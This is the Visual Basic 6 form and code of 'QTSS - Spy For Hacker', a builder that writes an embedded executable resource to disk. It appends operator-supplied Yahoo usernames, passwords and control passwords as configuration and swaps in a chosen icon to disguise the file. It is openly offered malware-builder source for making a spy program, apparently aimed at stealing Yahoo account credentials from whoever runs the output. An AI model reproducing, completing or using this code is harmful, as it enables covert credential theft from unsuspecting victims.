VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "Comdlg32.ocx"
Begin VB.Form Form1 
   Appearance      =   0  'Flat
   BackColor       =   &H80000007&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "QTSS V1.2 _ SPY FOR HACKER"
   ClientHeight    =   7890
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   10590
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   Picture         =   "Form1.frx":617A
   ScaleHeight     =   7890
   ScaleWidth      =   10590
   StartUpPosition =   1  'CenterOwner
   Begin VB.TextBox Text5 
      Alignment       =   2  'Center
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "Century Gothic"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H008080FF&
      Height          =   375
      Left            =   5040
      TabIndex        =   15
      Top             =   4920
      Width           =   3255
   End
   Begin VB.TextBox Text4 
      Alignment       =   2  'Center
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "Century Gothic"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H008080FF&
      Height          =   375
      Left            =   5040
      TabIndex        =   13
      Top             =   4440
      Width           =   3255
   End
   Begin QTSS.MyButton Command1 
      Height          =   735
      Left            =   3360
      TabIndex        =   8
      Top             =   6360
      Width           =   3495
      _ExtentX        =   6165
      _ExtentY        =   1296
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Comic Sans MS"
         Size            =   15.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Caption         =   "Create Spy's File"
      IconHighLiteColor=   0
      CaptionHighLiteColor=   0
      Style           =   7
      Checked         =   0   'False
      ColorButtonHover=   33023
      ColorButtonUp   =   255
      ColorButtonDown =   12632319
      BorderBrightness=   0
      ColorBright     =   33023
      DisplayHand     =   0   'False
      ColorScheme     =   0
   End
   Begin VB.TextBox txtIcon 
      BackColor       =   &H00000000&
      Enabled         =   0   'False
      ForeColor       =   &H80000005&
      Height          =   285
      Left            =   3120
      TabIndex        =   7
      Top             =   5760
      Width           =   3975
   End
   Begin MSComDlg.CommonDialog Dialog1 
      Left            =   2760
      Top             =   6600
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.TextBox Text3 
      Alignment       =   2  'Center
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "Century Gothic"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H008080FF&
      Height          =   375
      Left            =   5040
      TabIndex        =   6
      Top             =   3840
      Width           =   3255
   End
   Begin VB.TextBox Text2 
      Alignment       =   2  'Center
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "Century Gothic"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H008080FF&
      Height          =   375
      Left            =   5040
      TabIndex        =   5
      Top             =   3360
      Width           =   3255
   End
   Begin VB.TextBox Text1 
      Alignment       =   2  'Center
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "Century Gothic"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H008080FF&
      Height          =   405
      Left            =   5040
      TabIndex        =   4
      Top             =   2880
      Width           =   3255
   End
   Begin VB.Timer Timer1 
      Interval        =   50
      Left            =   2160
      Top             =   6360
   End
   Begin QTSS.MyButton Command2 
      Height          =   495
      Left            =   1320
      TabIndex        =   9
      Top             =   5640
      Width           =   1575
      _ExtentX        =   2778
      _ExtentY        =   873
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Comic Sans MS"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Caption         =   "Select Icon"
      IconHighLiteColor=   0
      CaptionHighLiteColor=   0
      Style           =   7
      Checked         =   0   'False
      ColorButtonHover=   33023
      ColorButtonUp   =   255
      ColorButtonDown =   12632319
      BorderBrightness=   0
      ColorBright     =   33023
      DisplayHand     =   0   'False
      ColorScheme     =   0
   End
   Begin QTSS.MyButton How 
      Height          =   495
      Left            =   120
      TabIndex        =   11
      Top             =   7320
      Width           =   1575
      _ExtentX        =   2778
      _ExtentY        =   873
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Comic Sans MS"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Caption         =   "About"
      IconHighLiteColor=   0
      CaptionHighLiteColor=   0
      Style           =   7
      Checked         =   0   'False
      ColorButtonHover=   16711680
      ColorButtonUp   =   12582912
      ColorButtonDown =   16711680
      BorderBrightness=   0
      ColorBright     =   16711935
      DisplayHand     =   0   'False
      ColorScheme     =   0
   End
   Begin VB.Label Label6 
      Appearance      =   0  'Flat
      BackColor       =   &H80000006&
      BackStyle       =   0  'Transparent
      Caption         =   "PassWord To Delete :"
      BeginProperty Font 
         Name            =   "Comic Sans MS"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   375
      Left            =   2160
      TabIndex        =   14
      Top             =   4920
      Width           =   2895
   End
   Begin VB.Label Label5 
      Appearance      =   0  'Flat
      BackColor       =   &H80000006&
      BackStyle       =   0  'Transparent
      Caption         =   "PassWord To Tester :"
      BeginProperty Font 
         Name            =   "Comic Sans MS"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   375
      Left            =   2160
      TabIndex        =   12
      Top             =   4320
      Width           =   2895
   End
   Begin VB.Label lblE 
      Alignment       =   2  'Center
      BackColor       =   &H80000008&
      BackStyle       =   0  'Transparent
      BeginProperty Font 
         Name            =   "Comic Sans MS"
         Size            =   20.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FF0000&
      Height          =   735
      Left            =   3000
      TabIndex        =   10
      Top             =   7080
      Width           =   4335
   End
   Begin VB.Image Image1 
      Height          =   1095
      Left            =   7200
      Top             =   5400
      Width           =   1095
   End
   Begin VB.Label Label4 
      Appearance      =   0  'Flat
      BackColor       =   &H80000006&
      BackStyle       =   0  'Transparent
      Caption         =   "Your Yahoo ID        :"
      BeginProperty Font 
         Name            =   "Comic Sans MS"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   375
      Left            =   2160
      TabIndex        =   3
      Top             =   3840
      Width           =   2895
   End
   Begin VB.Label Label3 
      Appearance      =   0  'Flat
      BackColor       =   &H80000006&
      BackStyle       =   0  'Transparent
      Caption         =   "Spy Yahoo PassWord :"
      BeginProperty Font 
         Name            =   "Comic Sans MS"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   375
      Left            =   2160
      TabIndex        =   2
      Top             =   3360
      Width           =   2775
   End
   Begin VB.Label Label2 
      Appearance      =   0  'Flat
      BackColor       =   &H80000006&
      BackStyle       =   0  'Transparent
      Caption         =   "Spy Yahoo UserName :"
      BeginProperty Font 
         Name            =   "Comic Sans MS"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   375
      Left            =   2160
      TabIndex        =   1
      Top             =   2880
      Width           =   2775
   End
   Begin VB.Label Label1 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H80000006&
      BackStyle       =   0  'Transparent
      Caption         =   "QTSS - Spy For Hacker"
      BeginProperty Font 
         Name            =   "Comic Sans MS"
         Size            =   36
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   1335
      Left            =   0
      TabIndex        =   0
      Top             =   840
      Width           =   10575
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'***************************************************************
'*************    CODE BY DINHQUANGTRUNG90@YAHOO.COM    ********
'***************************************************************
'***************************************************************
'***************************************************************
'***************************************************************
'***************************************************************
'***************************************************************

' 101 is vr file!
Dim TieuDe As String

Private Sub Command1_Click()
lblE = ""
If Text1 = "" Or Text2 = "" Or Text3 = "" Then
lblE = "No Value"
Else
Create
If txtIcon.Text <> "" Then
On Error GoTo Thoatat
ReplaceIcons txtIcon.Text, Dialog1.FileName, Err
Thoatat:
End If
End If


End Sub

Private Sub Command2_Click()
lblE = ""
On Error GoTo Erorr
With Dialog1
.CancelError = True
.DialogTitle = "Spy's Icon"
.Filter = "Icon's File (*.ICO)|*.ICO|"
.ShowOpen
End With
txtIcon.Text = Dialog1.FileName
Image1.Picture = LoadPicture(Dialog1.FileName)
Erorr:
End Sub



Private Sub Command3_Click()
frmIcon.Show
End Sub







Private Sub Create()
On Error GoTo Erorrhandle
With Dialog1
.CancelError = True
.DialogTitle = "Save Spy's File"
.Filter = "Exe's File (*.exe)|*.exe|"
.FileName = ""
.ShowSave
End With

Dim bytResourceData() As Byte
bytResourceData = LoadResData(101, "CUSTOM")
Open Dialog1.FileName For Binary Shared As #1
Put #1, 1, bytResourceData
Close #1

')))))))))))))))))))))))0
 Dim BeginPos As Long
    Dim PropBag As New PropertyBag
    Dim varTemp As Variant
    

    With PropBag
        .WriteProperty "USER", Text1.Text
        .WriteProperty "PASS", Text2.Text
        .WriteProperty "YOU", Text3.Text
        .WriteProperty "MA", Text4.Text
        .WriteProperty "GIAI", Text5.Text
    End With
    
    Open Dialog1.FileName For Binary As #1
        BeginPos = LOF(1)
                
        varTemp = PropBag.Contents
                
        Seek #1, LOF(1)
        Put #1, , varTemp
        Put #1, , BeginPos
    
    Close #1

    lblE = "Created !"
  '((((((((((((((((((((((((((((((



Erorrhandle:

End Sub

Private Sub Form_Click()
lblE = ""
End Sub

Private Sub Form_Load()
lblE = ""
End Sub





Private Sub How_Click()
frmAbout.Show
End Sub



Private Sub Text1_Click()
lblE = ""
End Sub



Private Sub Text2_Click()
lblE = ""
End Sub



Private Sub Text3_Click()
lblE = ""
End Sub
